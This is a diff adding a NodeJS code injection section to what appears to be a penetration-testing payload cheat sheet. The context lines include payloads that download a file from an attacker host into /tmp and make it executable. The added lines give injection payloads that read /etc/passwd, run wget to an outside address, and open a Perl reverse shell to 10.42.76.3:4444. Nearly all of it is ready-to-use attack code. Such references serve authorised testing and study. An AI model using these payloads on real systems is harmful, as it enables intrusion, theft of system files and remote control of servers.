@@ -38,6 +38,40 @@ http://victim/file?arg=$({wget,http://[AttackerIP]:[AttackerPort]/t,-O,/tmp/t})
 http://victim/file?arg=$({chmod,+x,/tmp/t})
 {% endhighlight %}
 
+> **NodeJS Code Injection**
+
+Look for javascript errors in output:
+"SyntaxError: Unexpected token function"
+"SyntaxError: Unexpected end of input"
+
+Test for injection:
+
+{% highlight javascript %}
+0; res.json({"foo": "bar"});
+//look for json foo back
+{% endhighlight %}
+
+Read Files:
+
+{% highlight javascript %}
+0; var fs = require('fs'); fs.readFile('/etc/passwd', function(err, data) {
+    res.writeHead(200, {'Content-Type': 'text/html'});
+    res.write(data);
+    res.end();
+  });
+{% endhighlight %}
+
+Test remote connectivity:
+
+{% highlight javascript %}
+0; var exec = require('child_process').exec; var child = exec('wget -O /dev/null -q 10.42.76.3',function (error, stdout, stderr) { });
+{% endhighlight %}
+
+Remote Shell:
+
+{% highlight javascript %}
+0; var exec = require('child_process').exec; var child = exec("perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.42.76.3:4444\"); STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",function (error, stdout, stderr) { });
+{% endhighlight %}
 
 > **PHP Code Injection**
 
